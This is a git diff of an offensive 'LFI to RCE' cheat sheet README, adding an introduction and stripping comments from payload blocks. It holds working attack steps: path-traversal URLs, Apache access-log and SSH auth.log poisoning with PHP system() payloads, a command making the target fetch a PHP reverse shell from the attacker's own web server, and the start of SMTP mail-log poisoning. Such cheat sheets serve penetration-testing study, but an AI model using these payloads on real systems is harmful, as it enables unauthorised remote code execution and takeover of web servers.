@@ -1,5 +1,7 @@
 # LFI---RCE-Cheat-Sheet
-Transition form local file inclusion attacks to remote code exection
+
+Local File Inclusions occur when an HTTP-GET request has an unsanitized variable input which will allow you to traverse the directory and read files. This attack can often provide key information during a reconnaissance and can sometimes be used to gain remote code execution.
+
 
 # Vulnerable PHP Code (LFI) 1
 
@@ -99,27 +101,28 @@ print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|
 ```
 Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 
 
-// Must have the ability to read the log file 
+ 
 
 Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 
 
-// Replace IP with your target 
+
 
 Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id
 
 OR
+
 python -m SimpleHTTPServer 9000 
 
-// You can use any port
+
 
 Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 
 
-// This will download the PHP reverse shell from your web server onto the target
 
 file_put_contents('shell.php')                                // What it will be saved locally on the target
 file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called
 
 Execute PHP Reverse Shell: http//10.10.10.10/shell.php
+
 ```
 
 # LFI to RCE via SSH Log File Poisoning (PHP)
@@ -127,11 +130,10 @@ Execute PHP Reverse Shell: http//10.10.10.10/shell.php
 ```
 Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 
 
-// Must have the ability to read the log file
+
 
 Payload: ssh <?php system($_GET['c']);?>@<target_ip>
 
-// Replace with the target IP
 
 Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
 
@@ -142,7 +144,7 @@ Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.
 ```
 Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 
 
-// Must have the ability to read the log file
+
 
 telnet <target_ip> 25 // Replace with the target IP
 MAIL FROM:<toor@gmail.com>
